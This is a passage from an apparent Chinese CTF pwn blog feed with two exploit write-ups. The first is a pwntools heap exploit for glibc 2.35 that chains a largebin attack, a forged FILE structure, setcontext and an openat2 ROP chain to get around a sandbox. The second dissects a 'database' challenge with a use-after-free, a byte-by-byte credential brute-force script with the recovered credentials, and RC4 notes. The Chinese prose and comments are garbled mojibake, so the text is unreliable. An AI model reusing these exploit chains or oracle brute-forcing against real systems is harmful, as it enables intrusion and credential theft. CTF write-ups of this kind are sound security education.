\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter which to delete: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your choice: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter which to edit: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input the content \n&#x27;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your choice: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter which to show: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">buf, content</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your choice: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your target addr \n&#x27;</span>)</span><br><span class="line">p.send(buf)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="comment">### largebin attack é¢„å¤‡</span></span><br><span class="line"><span class="comment"># æ²™ç®±å †é£æ°´ä¸å½±å“large</span></span><br><span class="line">add(<span class="number">0x520</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x520</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x510</span>) <span class="comment"># 3</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># 1 in unsorted</span></span><br><span class="line">add(<span class="number">0x530</span>) <span class="comment"># 4, 1 in largebinï¼Œ3&lt;1ï¼Œæˆ‘ä»¬ç­‰ä¼šç”¨æ¥è§¦å‘æ”»å‡»</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># ---------------leak---------------</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;The content is here \n&#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x21b110</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] libc_base: &quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line">IO_list_all = libc_base + <span class="number">0x21b680</span></span><br><span class="line">rtld_global = libc_base + <span class="number">0x29c040</span></span><br><span class="line">link_map = libc_base + <span class="number">0x29d2e0</span></span><br><span class="line">setcontext = libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">mprotect = libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">8</span>))-<span class="number">0x1950</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] heap_base: &quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="comment"># ---------------leak---------------</span></span><br><span class="line"><span class="comment">### -----------orw ROP chain using openat2: åŸºäºglibc2.35, å†ç¢°è§2.35çš„æˆ–è®¸å¯ä»¥ç›´æ¥å¥—--------------</span></span><br><span class="line">ret = libc_base+<span class="number">0x2a3e6</span></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x2be51</span></span><br><span class="line">pop_rdx_rbx=libc_base+<span class="number">0x904a9</span></span><br><span class="line">pop_rax=libc_base+<span class="number">0x45eb0</span></span><br><span class="line">pop_rcx=libc_base+<span class="number">0x3d1ee</span></span><br><span class="line">pop_r8=libc_base+<span class="number">0x1659e6</span></span><br><span class="line">syscall=libc_base+<span class="number">0x91316</span></span><br><span class="line">flag_addr=heap_base+<span class="number">0x1950</span>+<span class="number">0x100</span> <span class="comment"># éšä¾¿æ¢</span></span><br><span class="line">payload=p64(pop_rdi)+p64(<span class="number">437</span>)+p64(pop_rsi)+p64(<span class="number">0xffffffffffffff9c</span>)+p64(pop_rdx_rbx)+p64(flag_addr)+p64(<span class="number">0</span>)+p64(pop_rcx)+p64(heap_base+<span class="number">0x100</span>)+p64(pop_r8)+p64(<span class="number">24</span>)+p64(libc.sym[<span class="string">&quot;syscall&quot;</span>]) <span class="comment"># openat2ï¼Œè¿™é‡Œæ¢openä¹Ÿè¡Œ</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0x3</span>)+p64(pop_rsi)+p64(heap_base)+p64(pop_rdx_rbx)+p64(<span class="number">0x30</span>)+p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">&quot;read&quot;</span>]) <span class="comment"># read</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(libc.sym[<span class="string">&quot;write&quot;</span>]) <span class="comment"># write</span></span><br><span class="line">fake_stack=heap_base+<span class="number">0x1950</span>+<span class="number">0x200</span> <span class="comment"># å›ºå®š</span></span><br><span class="line"><span class="comment"># ç¡®å®šflagçš„åœ°å€ å¡«åˆ°flagé‡Œ</span></span><br><span class="line"><span class="comment">### ---------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">### â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“é‡è¦â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“</span></span><br><span class="line"><span class="comment"># ä¸‹é¢çš„-0x10æ˜¯å› ä¸ºeditå†™å…¥æ˜¯ä»å†…å®¹å¼€å§‹å†™ï¼Œè€Œio_list_allåˆ°æ—¶å€™ä¼šè¢«æ”¹æˆå¸¦æœ‰å…ƒæ•°æ®çš„èµ·å§‹åœ°å€ï¼Œ-0x10</span></span><br><span class="line"><span class="comment"># å†™æˆè¿™æ ·æ˜¯æ›´æ–¹ä¾¿ç†è§£</span></span><br><span class="line">fs_wdata = fit( <span class="comment"># overlap ç­‰äºwide_vtableå’Œwide_dataåœ¨ä¸€èµ·</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment"># å‰4å­—æ®µï¼Œä¸ºäº†è®©æˆ‘ä»¬èƒ½å–å›è¿™ä¸ªå—ï¼Œä¿ç•™å¥½</span></span><br><span class="line">        <span class="number">0x0</span>:p64(libc_base+<span class="number">0x21b110</span>), <span class="comment"># 0x520çš„binåœ°å€</span></span><br><span class="line"><span class="number">0x8</span>:p64(libc_base+<span class="number">0x21b110</span>),</span><br><span class="line"><span class="number">0x10</span>:p64(heap_base+<span class="number">0x1950</span>), <span class="comment"># self</span></span><br><span class="line"><span class="number">0x18</span>: p64(IO_list_all-<span class="number">0x20</span>), <span class="comment"># target-0x20</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0xa0</span>-<span class="number">0x10</span>: heap_base+<span class="number">0x1950</span>+<span class="number">0x100</span>, <span class="comment"># wide_data æŒ‡å‘è‡ªå·±+0x100</span></span><br><span class="line">        <span class="number">0xd8</span>-<span class="number">0x10</span>: libc.sym._IO_wfile_jumps-<span class="number">0xc0</span>,</span><br><span class="line"><span class="comment"># wide_data+wide_vtable:</span></span><br><span class="line">        <span class="number">0x0</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: <span class="string">b&quot;flag&quot;</span>.ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>), <span class="comment"># éšä¾¿å¡«çš„</span></span><br><span class="line">        <span class="number">0x18</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: p64(<span class="number">0x0</span>), <span class="comment"># apple v2çš„è¦æ±‚</span></span><br><span class="line">        <span class="number">0x30</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: p64(<span class="number">0x0</span>), <span class="comment"># apple v2çš„è¦æ±‚</span></span><br><span class="line">        <span class="number">0x68</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: p64(setcontext),  <span class="comment"># _wide_vtable -&gt; wdoallocateçš„ä½ç½® æ§åˆ¶æµè§¦å‘</span></span><br><span class="line"><span class="comment">## setcontextæ‰€éœ€è¦çš„å‚æ•°ï¼š</span></span><br><span class="line">        <span class="number">0xa0</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: p64(fake_stack),</span><br><span class="line">        <span class="number">0xa8</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: p64(ret), <span class="comment"># mov rdx+0xa8, push rcx, è¿”å›åœ°å€</span></span><br><span class="line">        <span class="comment">## _wide_data-&gt;_wide_vtable æŒ‡å‘è‡ªå·±+0x100,å’Œwidedataå¹³é½</span></span><br><span class="line">        <span class="number">0xE0</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: heap_base+<span class="number">0x1950</span>+<span class="number">0x100</span>, </span><br><span class="line"><span class="comment"># ropchain/fake stack:</span></span><br><span class="line">        <span class="number">0x200</span>-<span class="number">0x10</span>: payload <span class="comment"># æ¢shellcodeä¹Ÿè¡Œï¼Œé‚£ä¹ˆä¸Šé¢0xa8å°±è¦å†™è¿™é‡Œçš„åœ°å€äº†</span></span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&quot;\x00&quot;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+]_IO_list_all: <span class="subst">&#123;fs_wdata&#125;</span>&quot;</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">1</span>,fs_wdata)</span><br><span class="line">add(<span class="number">0x550</span>) <span class="comment"># 4, largebin attack</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment"># 5ï¼Œå–å‡ºåˆšåˆšçš„chunk3ï¼Œè®©targetå†™å…¥chunk1çš„åœ°å€</span></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b * setcontext+61&quot;</span>)</span><br><span class="line">add(<span class="number">0x550</span>) <span class="comment"># 6 è¶…å‡ºä¸Šé™ï¼Œç”¨äºè§¦å‘exitçš„æ“ä½œ</span></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># exit-&gt;fcloseall(__flcloseall)-&gt;IO_cleanup-&gt;_IO_flush_all_lockp</span></span><br></pre></td></tr></table></figure><h2 id="tls-dtor-lists">tls_dtor_lists</h2><p>åˆ©ç”¨ç¨‹åºldæ®µè¿›è¡Œæ”»å‡»ã€‚</p><h2 id="libc-got-ç–‘ä¼¼é¢„æœŸè§£">libc got-ç–‘ä¼¼é¢„æœŸè§£</h2><blockquote></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;é¢˜ç›®åˆ†æ&lt;/h1&gt;
&lt;p&gt;è¿™ä¸ªé¢˜ç›®ç»™äº†ç›¸å½“å¤šçš„checkï¼š&lt;/p&gt;
&lt;ul class=&quot;lvl-0&quot;&gt;
&lt;li class=&quot;lvl-2&quot;&gt;æ²™ç®±banäº†openï¼Œopenatå’Œexecveï¼Œglibc 2.35, é‡Šæ”¾æœ‰UAF, chunkåªèƒ½åˆ†é…0x500-0x5FF</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
    <category term="heap" scheme="https://zjw1nd.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>How2Heapå®æˆ˜â€”â€”ç½‘é¼æ¯database wp</title>
    <link href="https://zjw1nd.github.io/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E7%BD%91%E9%BC%8E%E6%9D%AFdatabase-wp/"/>
    <id>https://zjw1nd.github.io/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E7%BD%91%E9%BC%8E%E6%9D%AFdatabase-wp/</id>
    <published>2024-11-10T15:29:18.000Z</published>
    <updated>2024-11-14T11:57:33.270Z</updated>
    
    <content type="html"><![CDATA[<h1>é¢˜ç›®åˆ†æ</h1><p>Glibc2.27ï¼Œ64ä½ä¿æŠ¤å…¨å¼€ï¼Œæ²™ç®±banæ‰äº†execveå’Œexecveatï¼Œæ‰“orwã€‚</p><h2 id="çˆ†ç ´ç”¨æˆ·åå’Œå¯†ç ">çˆ†ç ´ç”¨æˆ·åå’Œå¯†ç </h2><p>è¿™ä¸ªç¨‹åºä¸Šæ¥å…ˆåœ¨è¿œç¨‹æ‰“å¼€äº†ç”¨æˆ·åå’Œå¯†ç çš„æ–‡ä»¶è¦æˆ‘ä»¬è¾“å…¥ï¼Œæ‰¾äº†åŠå¤©æ²¡æ‰¾åˆ°é¢˜ç›®é‡Œèƒ½æœ‰ä»€ä¹ˆæç¤ºï¼Œè¿˜æ˜¯å½“æ—¶é˜Ÿé‡Œåšé€†å‘çš„å¸ˆå‚…æå®šçš„ã€‚è§‚å¯Ÿå‘ç°ï¼Œå‡½æ•°æ¯”è¾ƒè¾“å…¥çš„é€»è¾‘æ¯”è¾ƒå¥‡æ€ªã€‚å…ˆè°ƒç”¨äº†ä¸€ä¸ªè‡ªå·±å®ç°çš„strcmpï¼Œè¿™é‡Œå¯¹æˆ‘ä»¬çš„ç”¨æˆ·è¾“å…¥è°ƒç”¨äº†strlenï¼Œç„¶åæŒ‰ç…§ç”¨æˆ·è¾“å…¥çš„é•¿åº¦å»æ¯”è¾ƒï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">my_strcmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1[i] != a2[i] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸­é—´æœ‰ä¸ä¸€æ ·çš„å°±è¿”å›â€œInvalid usernameâ€ï¼Œè€Œå¦‚æœå…¨ä¸€æ ·å†å»æ¯”è¾ƒç”¨æˆ·è¾“å…¥å’ŒæŒ‡å®šç”¨æˆ·å/å¯†ç çš„é•¿åº¦ï¼Œä¸ä¸€æ ·å†è¾“å‡º&quot;Invalid password&quot;.è¿™ä¸¤ç§ä¸åŒçš„å›æ˜¾åŠ ä¸Šæºç¨‹åºæ­»å¾ªç¯è°ƒç”¨çš„ç‰¹æ€§ï¼Œè®©æˆ‘ä»¬å¯ä»¥è½»æ˜“çš„åˆ©ç”¨è¿™ä¸€ç‚¹å»å¯¹ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œçˆ†ç ´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hello, Welcome to the Security Database. Login first!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input your username:&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x11</span>uLL);</span><br><span class="line">    input(<span class="number">0</span>, s, <span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)my_strcmp(s, ptr) )<span class="comment">// å¯¹æˆ‘ä»¬çš„è¾“å…¥è°ƒäº†strlenï¼Œ\0ç»•è¿‡ï¼Ÿ</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid username!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="built_in">strlen</span>(ptr) )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Invalid username length!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Username correct!&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Input your password:&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯è¿™ä¸ªé€å­—èŠ‚çˆ†ç ´çš„æ€è·¯ï¼šè®©charä»0åˆ°0xFFéå†ï¼ŒæˆåŠŸäº†ï¼ˆå›æ˜¾ä¸ä¸€æ ·ï¼‰å°±åŠ åˆ°å‘é€å†…å®¹çš„åé¢ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">crack_username</span>():</span><br><span class="line">    username = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>):</span><br><span class="line">            <span class="keyword">if</span>(char == <span class="number">10</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            crack=username + char.to_bytes()</span><br><span class="line">            p.sendlineafter(<span class="string">b&#x27;Input your username:&#x27;</span>, crack)</span><br><span class="line">            p.recvline()</span><br><span class="line">            result=p.recvline()</span><br><span class="line">            <span class="keyword">if</span>(result==<span class="string">b&#x27;Invalid username!\n&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span>(result==<span class="string">b&#x27;Invalid username length!\n&#x27;</span>):</span><br><span class="line">                username += char.to_bytes()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span>(result==<span class="string">b&#x27;Username correct!\n&#x27;</span>):</span><br><span class="line">                username += char.to_bytes()</span><br><span class="line">                <span class="built_in">print</span>(username)</span><br><span class="line">                <span class="keyword">return</span> username</span><br><span class="line"><span class="comment"># 4dm1n</span></span><br><span class="line"><span class="comment"># 985da4f8cb37zkj</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_password</span>():</span><br><span class="line">    password=<span class="string">b&#x27;985da4f8cb37zkj&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">if</span>(char == <span class="number">10</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            crack=password + char.to_bytes()</span><br><span class="line">            p.sendlineafter(<span class="string">b&#x27;Input your username:&#x27;</span>, <span class="string">b&#x27;4dm1n&#x27;</span>)</span><br><span class="line">            p.sendlineafter(<span class="string">b&#x27;Input your password:&#x27;</span>, crack)</span><br><span class="line">            p.recvline()</span><br><span class="line">            result=p.recvline()</span><br><span class="line">            <span class="keyword">if</span>(result==<span class="string">b&#x27;Invalid password!\n&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span>(result==<span class="string">b&#x27;Invalid password length!\n&#x27;</span>):</span><br><span class="line">                password += char.to_bytes()</span><br><span class="line">                <span class="built_in">print</span>(password)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span>(result==<span class="string">b&#x27;Password correct!\n&#x27;</span>):</span><br><span class="line">                password += char.to_bytes()</span><br><span class="line">                <span class="built_in">print</span>(password)</span><br><span class="line">                <span class="keyword">return</span> password</span><br></pre></td></tr></table></figure><h2 id="æ§åˆ¶æµä¸åŠ å¯†">æ§åˆ¶æµä¸åŠ å¯†</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( input_10() )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    save_data();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    read_data();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    delete_data();                <span class="comment">// UAF here</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    edit_data();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¢æŸ¥åˆ æ”¹ï¼Œç¨‹åºå…è®¸é€šè¿‡exitå‡½æ•°é€€å‡ºã€‚æŒ‡é’ˆå’Œsizeåœ¨å…¨å±€å˜é‡æ•°ç»„é‡Œç®¡ç†ï¼Œå¯ä»¥çœ‹åˆ°freeå­˜åœ¨UAFæ¼æ´ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">delete_data</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">char</span> *ptr; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the key: &quot;</span>);</span><br><span class="line">  v2 = input_10();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid key!&quot;</span>);</span><br><span class="line">  ptr = (<span class="type">char</span> *)chunks[<span class="number">2</span> * v2 + <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(aS4cur1tyP4ssw0);</span><br><span class="line">    encrypt1(byte_203180, aS4cur1tyP4ssw0, v1);</span><br><span class="line">    encrypt2(byte_203180, ptr, LODWORD(chunks[<span class="number">2</span> * v2]));</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç¨‹åºè¿˜æœ‰ä¸€ä¸ªç‚¹æ˜¯åŠ å¯†ï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨äº†å¯†é’¥çš„å¯¹ç§°åŠ å¯†ã€‚å¯¹å¸¸è§çš„åŠ å¯†ç®—æ³•ä¸æ˜¯å¾ˆç†Ÿæ‰€ä»¥å½“æ—¶æ”¾å¼ƒäº†ï¼Œå…¶å®è¿™æ˜¯ä¸€ä¸ªrc4ã€‚</p><blockquote><p>RC4ç”±ä¼ªéšæœºæ•°ç”Ÿæˆå™¨å’Œå¼‚æˆ–è¿ç®—ç»„æˆã€‚RC4çš„å¯†é’¥é•¿åº¦å¯å˜ï¼ŒèŒƒå›´æ˜¯[1,255]ã€‚RC4ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚åœ°åŠ è§£å¯†ã€‚ç»™å®šä¸€ä¸ªå¯†é’¥ï¼Œä¼ªéšæœºæ•°ç”Ÿæˆå™¨æ¥å—å¯†é’¥å¹¶äº§ç”Ÿä¸€ä¸ªSç›’ã€‚Sç›’ç”¨æ¥åŠ å¯†æ•°æ®ï¼Œè€Œä¸”åœ¨åŠ å¯†è¿‡ç¨‹ä¸­Sç›’ä¼šå˜åŒ–ã€‚ç”±äºå¼‚æˆ–è¿ç®—çš„å¯¹åˆæ€§ï¼ŒRC4åŠ å¯†è§£å¯†ä½¿ç”¨åŒä¸€å¥—ç®—æ³•ã€‚</p></blockquote><p>ä¸‹é¢å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„rc4åŠ å¯†ç®—æ³•åˆå§‹åŒ–çš„è¿‡ç¨‹ï¼Œä¸€èˆ¬åˆå§‹åŒ–è¦åŒ…å«ä¸‰ä¸ªå‚æ•°ï¼šSboxæ•°ç»„ï¼Œå¯†é’¥ï¼Œå¯†é’¥çš„é•¿åº¦ã€‚</p><ol><li class="lvl-3"><p>åˆå§‹åŒ–å­˜å‚¨0-255å­—èŠ‚çš„Sbox(å…¶å®å°±æ˜¯ä¸€ä¸ªæ•°ç»„)</p></li><li class="lvl-3"><p>å¡«å……keyåˆ°256ä¸ªå­—èŠ‚æ•°ç»„ä¸­ç§°ä¸ºTbox(ä½ è¾“å…¥çš„keyä¸æ»¡256ä¸ªå­—èŠ‚åˆ™åˆå§‹åŒ–åˆ°256ä¸ªå­—èŠ‚)</p></li><li class="lvl-3"><p>äº¤æ¢s[i]ä¸s[j] i ä»0å¼€å§‹ä¸€ç›´åˆ°255ä¸‹æ ‡ç»“æŸ. jæ˜¯ s[i]ä¸T[i]ç»„åˆå¾—å‡ºçš„ä¸‹æ ‡ã€‚</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 